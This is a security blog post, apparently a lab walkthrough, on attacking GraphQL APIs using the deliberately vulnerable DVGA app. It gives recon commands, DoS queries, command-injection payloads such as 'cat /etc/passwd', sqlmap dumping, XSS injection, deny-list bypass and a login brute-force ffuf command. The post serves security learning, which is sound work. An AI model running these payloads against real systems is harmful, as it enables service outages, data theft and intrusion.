<!DOCTYPE html>
<html lang="en">
<head>
  
    <title>Attacking GraphQL :: My New Hugo Site</title>
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="Get started with GraphQL testing from Recon to Exploitation !" />
<meta name="keywords" content="" />

  <meta name="robots" content="noodp" />

<link rel="canonical" href="https://flowhero.github.io/newblog/posts/graphql-exploitation/" />





  
  <link rel="stylesheet" href="https://flowhero.github.io/newblog/css/buttons.min.3be0bba9fe18b5b77c8fe97175a5ff803eb3b8d6b94a4c43e6c842bc229040f1.css">

  
  <link rel="stylesheet" href="https://flowhero.github.io/newblog/css/code.min.00125962708925857e7b66dbc58391d55be1191a3d0ce2034de8c9cd2c481c36.css">

  
  <link rel="stylesheet" href="https://flowhero.github.io/newblog/css/fonts.min.90c955c31dd7c0e05aae3d4f583d4d8a2af799d69c961337eaf2a825063a55dd.css">

  
  <link rel="stylesheet" href="https://flowhero.github.io/newblog/css/footer.min.2e3eb191baee58dd05a9f0104ac1fab0827bca7c64dafe0b2579f934c33a1d69.css">

  
  <link rel="stylesheet" href="https://flowhero.github.io/newblog/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css">

  
  <link rel="stylesheet" href="https://flowhero.github.io/newblog/css/header.min.b6fb4423cf82a9f9d7abc9cd010223fa3d70a6526a3f28f8e17d814c06e18f9e.css">

  
  <link rel="stylesheet" href="https://flowhero.github.io/newblog/css/main.min.1d8be2dd1b5de9fdaed058c8c59fcf4485f36619574abfb47ed0cfda4812c16d.css">

  
  <link rel="stylesheet" href="https://flowhero.github.io/newblog/css/menu.min.83637a90d903026bc280d3f82f96ceb06c5fc72b7c1a8d686afb5bbf818a29f7.css">

  
  <link rel="stylesheet" href="https://flowhero.github.io/newblog/css/pagination.min.82f6400eae7c7c6dc3c866733c2ec0579e4089608fea69400ff85b3880aa0d3c.css">

  
  <link rel="stylesheet" href="https://flowhero.github.io/newblog/css/post.min.ae96bd858b485e91dd4d30f50f4298bdc371cb1a2a55dcfa043d76a6c95b59b0.css">

  
  <link rel="stylesheet" href="https://flowhero.github.io/newblog/css/prism.min.9023bbc24533d09e97a51a0a42a5a7bfe4c591ae167c5551fb1d2191d11977c0.css">

  
  <link rel="stylesheet" href="https://flowhero.github.io/newblog/css/syntax.min.cc789ed9377260d7949ea4c18781fc58959a89287210fe4edbff44ebfc1511b6.css">

  
  <link rel="stylesheet" href="https://flowhero.github.io/newblog/css/terminal.min.fa7e148bd9d175a5fda1e62ea44a0e535f3bb05f7634ec615154cccbe71b3a9a.css">

  
  <link rel="stylesheet" href="https://flowhero.github.io/newblog/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css">







<link rel="shortcut icon" href="https://flowhero.github.io/newblog/favicon.png">
<link rel="apple-touch-icon" href="https://flowhero.github.io/newblog/apple-touch-icon.png">


<meta name="twitter:card" content="summary" />



<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Attacking GraphQL">
<meta property="og:description" content="Get started with GraphQL testing from Recon to Exploitation !" />
<meta property="og:url" content="https://flowhero.github.io/newblog/posts/graphql-exploitation/" />
<meta property="og:site_name" content="My New Hugo Site" />

  <meta property="og:image" content="https://flowhero.github.io/newblog/og-image.png">

<meta property="og:image:width" content="1200">
<meta property="og:image:height" content="627">


  <meta property="article:published_time" content="2023-08-02 20:53:26 &#43;0100 &#43;0100" />












</head>
<body>


<div class="container">

  <header class="header">
  <div class="header__inner">
    <div class="header__logo">
      <a href="https://flowhero.github.io/newblog/">
  <div class="logo">
    Terminal
  </div>
</a>

    </div>
    
    
  </div>
  
</header>


  <div class="content">
    
<article class="post">
  <h1 class="post-title">
    <a href="https://flowhero.github.io/newblog/posts/graphql-exploitation/">Attacking GraphQL</a>
  </h1>
  <div class="post-meta"><time class="post-date">2023-08-02</time></div>

  
  


  

  <div class="post-content"><div>
        <h2 id="i---dvga">I - DVGA<a href="#i---dvga" class="hanchor" ariaLabel="Anchor">#</a> </h2>
<p>Use the following script to install &amp; run DVGA :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>git clone https://github.com/dolevf/Damn-Vulnerable-GraphQL-Application.git <span style="color:#f92672">&amp;&amp;</span> cd Damn-Vulnerable-GraphQL-Application
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>docker build -t dvga .
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>docker run -d -t -p 5013:5013 -e WEB_HOST<span style="color:#f92672">=</span>0.0.0.0 --name dvga dvga
</span></span></code></pre></div><h2 id="ii---toolkits">II - Toolkits<a href="#ii---toolkits" class="hanchor" ariaLabel="Anchor">#</a> </h2>
<ul>
<li><em>nmap</em> <strong>graphql-introspection</strong></li>
<li><em>Altair</em></li>
<li><em>InQL</em></li>
<li><em>SQLmap</em></li>
<li><em>graphw00f</em></li>
</ul>
<h2 id="iii---recon">III - Recon<a href="#iii---recon" class="hanchor" ariaLabel="Anchor">#</a> </h2>
<ul>
<li>is GraphQL running ?</li>
<li>What Endpoint ?</li>
<li>What GraphQL Engine ?</li>
<li>Attack Surface ?</li>
</ul>
<p>We can answer all these question using <code>graphw00f</code> :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>python3 main<span style="color:#f92672">.</span>py <span style="color:#f92672">-</span>d <span style="color:#f92672">-</span>f <span style="color:#f92672">-</span>t http:<span style="color:#f92672">//</span><span style="color:#ae81ff">127.0.0.1</span>:<span style="color:#ae81ff">5013</span>
</span></span></code></pre></div><h3 id="1---detecting-endpoints">1 - Detecting endpoints<a href="#1---detecting-endpoints" class="hanchor" ariaLabel="Anchor">#</a> </h3>
<p>we can use <code>ffuf</code> to fuzz for endpoints using this wordlist that holds common graphql endpoints</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ffuf -u http://localhost/FUZZ -w /home/hero/tools/graphql-tools/endpoints.txt
</span></span></code></pre></div><pre tabindex="0"><code>graphql
graphiql
v1/graphql
v2/graphql
v3/graphql
v1/graphiql
v2/graphiql
v3/graphiql
playground
v1/playground
v2/playground
v3/playground
api/v1/playground
api/v2/playground
api/v3/playground
console
api/graphql
api/graphiql
explorer
api/v1/graphql
api/v2/graphql
api/v3/graphql
api/v1/graphiql
api/v2/graphiql
api/v3/graphiql
v1/graphql
api/graphql
v1/api/graphql
graph
v1/graph
graphiql
v1/graphiql
console
query
graphql/console
altair
</code></pre><h3 id="2---introspection-scanning">2 - Introspection scanning<a href="#2---introspection-scanning" class="hanchor" ariaLabel="Anchor">#</a> </h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>nmap --script<span style="color:#f92672">=</span>graphql-introspection -sV 127.0.0.1 -p <span style="color:#ae81ff">5013</span>
</span></span></code></pre></div><ul>
<li>
<p>When introspection is enabled, the entire GraphQL schema can be retrieved with a single query.
<a href="https://gist.githubusercontent.com/craigbeck/b90915d49fda19d5b2b17ead14dcd6da/raw/e50819812a7a8a95b303ac0ea1464e2679e3e4bc/introspection-query.graphql">https://gist.githubusercontent.com/craigbeck/b90915d49fda19d5b2b17ead14dcd6da/raw/e50819812a7a8a95b303ac0ea1464e2679e3e4bc/introspection-query.graphql</a></p>
</li>
<li>
<p>Because the response of introspecion is overwhelming, We use <a href="https://ivangoncharov.github.io/graphql-voyager/">GraphQL-voyager</a>. for <em>nodes</em> and <em>edges</em> view</p>
</li>
<li>
<p>copy the response data and paste it into Graphql-voyager’s editor.</p>
</li>
<li>
<p>we should also check if the <em>GraphiQL</em> is enabled. which allows constructing queries in a friendly user interface.</p>
</li>
<li>
<p>GraphiQL is usually found in paths such as: /graphiql or __graphiql</p>
</li>
</ul>
<h2 id="iv---dos">IV - DoS<a href="#iv---dos" class="hanchor" ariaLabel="Anchor">#</a> </h2>
<h3 id="1---batch-queries">1 - Batch Queries<a href="#1---batch-queries" class="hanchor" ariaLabel="Anchor">#</a> </h3>
<p>we can only send it using <em>Burp</em> or <em>curl</em></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>[
</span></span><span style="display:flex;"><span>{<span style="color:#f92672">&#34;query&#34;</span> :<span style="color:#e6db74">&#34;query {systemHealth }&#34;</span> },
</span></span><span style="display:flex;"><span>{<span style="color:#f92672">&#34;query&#34;</span> :<span style="color:#e6db74">&#34;query {systemHealth }&#34;</span> }
</span></span><span style="display:flex;"><span>]
</span></span></code></pre></div><p>this shows that batch queries are enabled</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>[{<span style="color:#f92672">&#34;data&#34;</span>:{<span style="color:#f92672">&#34;systemHealth&#34;</span>:<span style="color:#e6db74">&#34;System Load: 0.00\n&#34;</span>}},{<span style="color:#f92672">&#34;data&#34;</span>:{<span style="color:#f92672">&#34;systemHealth&#34;</span>:<span style="color:#e6db74">&#34;System Load: 0.00\n&#34;</span>}}]
</span></span></code></pre></div><p>Now you can send 100 queries and overload the system</p>
<h3 id="2---deep-recursion-query-attack">2 - Deep recursion query attack<a href="#2---deep-recursion-query-attack" class="hanchor" ariaLabel="Anchor">#</a> </h3>
<p><code>PasteObject</code> and <code>OwnerObject</code> cross reference each other so let’s use that.</p>
<p><strong>Automatically</strong> detect circular relationships in the schema:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>inql <span style="color:#f92672">-</span>t http:<span style="color:#f92672">//</span><span style="color:#ae81ff">127.0.0.1</span>:<span style="color:#ae81ff">5013</span><span style="color:#f92672">/</span>graphql <span style="color:#f92672">--</span>generate<span style="color:#f92672">-</span>cycles <span style="color:#f92672">-</span>o dvga_cycles
</span></span></code></pre></div><p>This confirms what we found in GraphQL Voyager:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat /tmp/dvga_cycles/127.0.0.1:5013
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Cycles<span style="color:#f92672">(</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">{</span> OwnerObject -<span style="color:#f92672">[</span>paste<span style="color:#f92672">]</span>-&gt; PasteObject -<span style="color:#f92672">[</span>owner<span style="color:#f92672">]</span>-&gt; OwnerObject <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">{</span> OwnerObject -<span style="color:#f92672">[</span>pastes<span style="color:#f92672">]</span>-&gt; PasteObject -<span style="color:#f92672">[</span>owner<span style="color:#f92672">]</span>-&gt; OwnerObject <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">)</span>
</span></span></code></pre></div><p>We can then exhaust system ressources using <a href="https://github.com/dolevf/Black-Hat-GraphQL/blob/master/ch05/unsafe-circular-query.graphql">Unsafe Circular Query</a></p>
<blockquote>
<p>Solution : the developper must set a value for <code>maxQueryDepth</code>, determines how many query we can send in one request. For instance we can set <code>maxQueryDepth</code>: 5</p>
</blockquote>
<h3 id="3---field-duplucation-attack">3 - Field Duplucation Attack<a href="#3---field-duplucation-attack" class="hanchor" ariaLabel="Anchor">#</a> </h3>
<p><img src="https://flowhero.github.io/assets/images/shemas/2023_07_29_011345.png" alt="image"></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>python3 <span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>hero<span style="color:#f92672">/</span>tools<span style="color:#f92672">/</span>graphql<span style="color:#f92672">-</span>tools<span style="color:#f92672">/</span>Black<span style="color:#f92672">-</span>Hat<span style="color:#f92672">-</span>GraphQL<span style="color:#f92672">/</span>ch05<span style="color:#f92672">/</span>exploit_threaded_field_dup<span style="color:#f92672">.</span>py http:<span style="color:#f92672">//</span><span style="color:#ae81ff">192.168.1.26</span>:<span style="color:#ae81ff">5013</span><span style="color:#f92672">/</span>graphql
</span></span></code></pre></div><p>This makes the app unresponsive. You can interrup the script with <code>CTRL-C</code> to get your shell back. And you will also need to restart DVGA on your target VM.</p>
<pre tabindex="0"><code class="language-ad-check" data-lang="ad-check">title: Solution
with **cost analysis** , this attack will not be as easy to carry out 
</code></pre><h3 id="4---aliases-based-attack">4 - Aliases Based attack<a href="#4---aliases-based-attack" class="hanchor" ariaLabel="Anchor">#</a> </h3>
<p>GraphQL doesn’t like dealing with identical response keys and will generally complain if a query includes a given field name twice and you pass an argument with a different value for each.</p>
<p>The difference is that using aliases will sometimes be more efficient, especially if a field de-duplication middleware is implemented. Note that a specific query middleware is needed on the GraphQL server to detect the use of aliases.</p>
<p>This python one liner will generate a <strong>list of 1000 aliases</strong> for you to crash the target</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>python3 <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#39;for i in range(0, 1000): print(&#34;q&#34;+str(i)+&#34;:&#34;+&#34;systemUpdate&#34;)&#39;</span>
</span></span></code></pre></div><h3 id="5---circular-fragment">5 - Circular fragment<a href="#5---circular-fragment" class="hanchor" ariaLabel="Anchor">#</a> </h3>
<p>Here we are creating two fragments on the <code>PasteObject</code> object style called <code>Start</code> and <code>End</code>, which call each other:</p>
<p><img src="https://flowhero.github.io/assets/images/shemas/2023_07_29_012710.png" alt="image"></p>
<p>This will crash server instantly</p>
<p>on a real target that uses a properly designed GraphQL engine, <strong>this attack should not work</strong>. <strong>But Test IT !!!!</strong></p>
<h2 id="v---information-disclosure">V - Information Disclosure<a href="#v---information-disclosure" class="hanchor" ariaLabel="Anchor">#</a> </h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-graphql" data-lang="graphql"><span style="display:flex;"><span><span style="color:#66d9ef">query</span> {
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">__schema</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">query</span><span style="color:#a6e22e">Type</span> { name }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">mutation</span><span style="color:#a6e22e">Type</span> { name }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">subscription</span><span style="color:#a6e22e">Type</span> { name }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>or for more schema infos :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-graphql" data-lang="graphql"><span style="display:flex;"><span><span style="color:#66d9ef">query</span> {
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">__schema</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">query</span><span style="color:#a6e22e">Type</span> { 
</span></span><span style="display:flex;"><span>      name
</span></span><span style="display:flex;"><span>      kind
</span></span><span style="display:flex;"><span>      fields {
</span></span><span style="display:flex;"><span>        name
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">mutation</span><span style="color:#a6e22e">Type</span> { 
</span></span><span style="display:flex;"><span>      name
</span></span><span style="display:flex;"><span>      kind
</span></span><span style="display:flex;"><span>      fields {
</span></span><span style="display:flex;"><span>        name
</span></span><span style="display:flex;"><span>      } 
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">subscription</span><span style="color:#a6e22e">Type</span> { 
</span></span><span style="display:flex;"><span>      name
</span></span><span style="display:flex;"><span>      kind
</span></span><span style="display:flex;"><span>      fields {
</span></span><span style="display:flex;"><span>        name
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><ul>
<li>If <strong>Introspection is Disabled</strong> you cant do this</li>
</ul>
<p>So enumeration of fields and dynamic testing is required to understand the structure of the application.</p>
<p><strong>Obtain GraphQL API schema even if the introspection is disabled</strong>: <a href="https://github.com/nikitastupin/clairvoyance">clairvoyance</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>clairvoyance https://rickandmortyapi.com/graphql -o schema.json
</span></span></code></pre></div><p>To get Docs in <code>/graphiql</code> we need to do some <strong>Cookie Tampering</strong></p>
<ul>
<li>Open browser dev-tools and change <em>Cookie</em> <code>env = graphiql:disable</code> to <code>env = graphiql:enable</code></li>
</ul>
<p><img src="https://flowhero.github.io/assets/images/shemas/2023_07_29_015230.png" alt="image"></p>
<h3 id="1---graphql-field-suggestions">1 - GraphQL Field Suggestions<a href="#1---graphql-field-suggestions" class="hanchor" ariaLabel="Anchor">#</a> </h3>
<ul>
<li>we can query something random and the server will suggest valid fields with similar names :</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-graphql" data-lang="graphql"><span style="display:flex;"><span><span style="color:#66d9ef">query</span>{
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">system</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;errors&#34;</span>: [
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;message&#34;</span>: <span style="color:#e6db74">&#34;Cannot query field \&#34;system\&#34; on type \&#34;Query\&#34;. Did you mean \&#34;pastes\&#34;, \&#34;paste\&#34;, \&#34;systemUpdate\&#34; or \&#34;systemHealth\&#34;?&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;locations&#34;</span>: [
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">&#34;line&#34;</span>: <span style="color:#ae81ff">2</span>,
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">&#34;column&#34;</span>: <span style="color:#ae81ff">3</span>
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>      ]
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  ]
</span></span></code></pre></div><h2 id="vi---command-injection">VI - Command Injection<a href="#vi---command-injection" class="hanchor" ariaLabel="Anchor">#</a> </h2>
<h3 id="1---fuzzing-for-command-injection">1 - Fuzzing for Command Injection<a href="#1---fuzzing-for-command-injection" class="hanchor" ariaLabel="Anchor">#</a> </h3>
<p><img src="https://flowhero.github.io/assets/images/shemas/2023_08_01_144707.png" alt="image"></p>
<p>Metacharacters:</p>
<pre tabindex="0"><code>|
||
&amp;
&amp;&amp;
&#39;
&#34;
;
&#39;&#34;
</code></pre><p>Payloads:</p>
<pre tabindex="0"><code>whoami
id
cat /etc/passwd
uname -a
{&#34;$where&#34;: &#34;sleep(1000) &#34;}
;%00
-- -
</code></pre><p>Disable Payload Encoding for both payloads</p>
<p><img src="https://flowhero.github.io/assets/images/shemas/2023_08_01_144311.png" alt="image"></p>
<p>Start <em>Cluster Bomb</em> Attack
<img src="https://flowhero.github.io/assets/images/shemas/2023_08_01_150346.png" alt="image"></p>
<p>Look at resonses to see if there&rsquo;s a command injection vector, since there is nothing,
<strong>We test another Parameter</strong>, here we succeded in 2nd attempt:</p>
<p><img src="https://flowhero.github.io/assets/images/shemas/2023_08_01_150732.png" alt="image"></p>
<p>We can test for SQL injection by adding a <code>'</code> to the string.</p>
<p><img src="https://flowhero.github.io/assets/images/shemas/2023_08_01_145555.png" alt="image"></p>
<h3 id="2---exploiting">2 - Exploiting<a href="#2---exploiting" class="hanchor" ariaLabel="Anchor">#</a> </h3>
<p>As we can see, we are able to perform sql injections in this string !</p>
<p><img src="https://flowhero.github.io/assets/images/shemas/2023_08_01_145806.png" alt="image"></p>
<p>Copy as request and feed it to <code>sqlmap</code> , you need to add <code>*</code> in instead of <code>'</code> so that sqlmap procceses it</p>
<p><img src="https://flowhero.github.io/assets/images/shemas/2023_08_01_152154.png" alt="image"></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>sqlmap -r req.txt -tables --batch
</span></span></code></pre></div><p><img src="https://flowhero.github.io/assets/images/shemas/2023_08_01_152751.png" alt="image"></p>
<p>Now]]dump the</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>sqlmap -r request.txt -dbms<span style="color:#f92672">=</span>sqlite -dump
</span></span></code></pre></div><p>Then check results in <strong>cli</strong> or from <strong>files</strong></p>
<p><img src="https://flowhero.github.io/assets/images/shemas/2023_08_01_152845.png" alt="image"></p>
<h2 id="vii---xss-html-injection">VII - XSS, HTML Injection<a href="#vii---xss-html-injection" class="hanchor" ariaLabel="Anchor">#</a> </h2>
<p>We <strong>create</strong> or <strong>import</strong> a <em>paste</em> and set public to true so that we get victims :</p>
<p><img src="https://flowhero.github.io/assets/images/shemas/2023_08_01_162009.png" alt="image"></p>
<p>The mutation have been accepted, we can go back to the website to check :
<img src="https://flowhero.github.io/assets/images/shemas/2023_08_01_162227.png" alt="image"></p>
<p>we could similarly inject an html payload in content argument if the server is not sanitizing the request :</p>
<pre tabindex="0"><code>&lt;h1&gt;hello!&lt;/h1&gt;
</code></pre><h2 id="viii---graphql-query-deny-list-bypass">VIII - GraphQL Query Deny List Bypass<a href="#viii---graphql-query-deny-list-bypass" class="hanchor" ariaLabel="Anchor">#</a> </h2>
<p>Creating an <strong>allow-list</strong> or <strong>deny-list</strong> for GraphQL is a common technique to prevent malicious queries from being resolved by GraphQL.</p>
<p><img src="https://flowhero.github.io/assets/images/shemas/2023_08_01_165718.png" alt="image"></p>
<p>We can bypass this by changing operation name :</p>
<p><img src="https://flowhero.github.io/assets/images/shemas/2023_08_01_170146.png" alt="image"></p>
<hr>
<h2 id="bonus-tip">[BONUS] Tip<a href="#bonus-tip" class="hanchor" ariaLabel="Anchor">#</a> </h2>
<p>By default, FFUF works in clusterbomb mode.<br>
If you want to scan in pitchfork mode, add the <code>-mode pitchfork</code> flag to your command:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>ffuf -u http://targetwebsite.com -w /path/to/list/username.txt:FUZZ1 -w /path/to/list/password.txt:FUZZ2 -X POST -d <span style="color:#e6db74">&#39;username=FUZZ1&amp;passwd=FUZZ2&amp;submit=Submit&#39;</span> -H <span style="color:#e6db74">&#39;Content-Type: application/x-www-form-urlencoded&#39;</span> -mode pitchfork
</span></span></code></pre></div>
      </div></div>

  

  
    

  
</article>

  </div>

  
    <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright">
        <span>© 2024 Powered by <a href="https://gohugo.io">Hugo</a></span>
    
      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
      </div>
  </div>
</footer>






<script type="text/javascript" src="/newblog/bundle.min.js"></script>





  
</div>

</body>
</html>
